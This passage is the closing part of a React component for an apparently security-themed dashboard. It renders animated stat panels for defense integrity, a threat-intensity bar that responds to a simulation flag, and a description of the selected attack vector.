                      </div>
                    </div>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </div>

        {/* Bottom Stats Bar */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <div className="panel p-6 flex flex-col justify-center">
            <div className="flex justify-between items-center mb-4">
              <h4 className="stat-label flex items-center gap-2">
                <Shield className="text-accent-neon w-3 h-3" /> Defense Integrity
              </h4>
              <span className="text-[10px] font-mono text-risk-low">OPTIMAL</span>
            </div>
            <div className="flex gap-1 h-2">
              {Array.from({ length: 20 }).map((_, i) => (
                <div key={i} className="flex-1 bg-risk-low/20 rounded-sm overflow-hidden">
                  <motion.div 
                    animate={{ opacity: [0.2, 1, 0.2] }}
                    transition={{ duration: 2, repeat: Infinity, delay: i * 0.1 }}
                    className="h-full bg-risk-low"
                  />
                </div>
              ))}
            </div>
          </div>

          <div className="panel p-6 flex flex-col justify-center">
            <div className="flex justify-between items-center mb-4">
              <h4 className="stat-label flex items-center gap-2">
                <AlertCircle className="text-risk-high w-3 h-3" /> Threat Intensity
              </h4>
              <span className="stat-value text-risk-high">{isSimulating ? "CRITICAL" : "STABLE"}</span>
            </div>
            <div className="w-full bg-bg-surface h-2 rounded-full overflow-hidden">
              <motion.div 
                initial={{ width: "15%" }}
                animate={{ width: isSimulating ? "92%" : "15%" }}
                transition={{ type: "spring", damping: 20 }}
                className="h-full bg-gradient-to-r from-accent-neon via-risk-med to-risk-high"
              />
            </div>
          </div>

          <div className="panel p-6 flex flex-col justify-center">
            <div className="flex justify-between items-center mb-4">
              <h4 className="stat-label flex items-center gap-2">
                <Info className="text-text-dim w-3 h-3" /> Vector Details
              </h4>
              <Eye className="w-3 h-3 text-text-dim/30" />
            </div>
            <p className="text-[10px] text-text-dim font-mono leading-tight line-clamp-2">
              {selectedAttack.desc}
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}


